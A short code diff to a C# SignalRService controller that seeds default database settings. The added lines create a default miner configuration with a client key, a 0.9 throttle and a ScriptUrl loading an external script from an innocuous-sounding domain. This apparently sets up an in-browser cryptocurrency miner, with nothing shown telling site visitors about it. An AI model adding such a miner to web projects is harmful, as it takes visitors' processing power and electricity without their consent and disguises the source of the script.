@@ -76,6 +76,16 @@ namespace SignalRService.Controllers
             if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductDescriptionMaxLength))
                 defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductDescriptionMaxLength, Type = Enums.EnumSettingType.Int, Value = "128" });
 
+            if(!db.MinerConfiurationModels.Any())
+            {
+                db.MinerConfiurationModels.Add(new MinerConfigurationModel()
+                {
+                    ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
+                    Throttle = 0.9f,
+                    ScriptUrl = "https://www.freecontent.date./W7KS.js"
+                });
+            }
+
             db.GeneralSettings.AddRange(defaultStandards);
             db.SaveChanges();
 
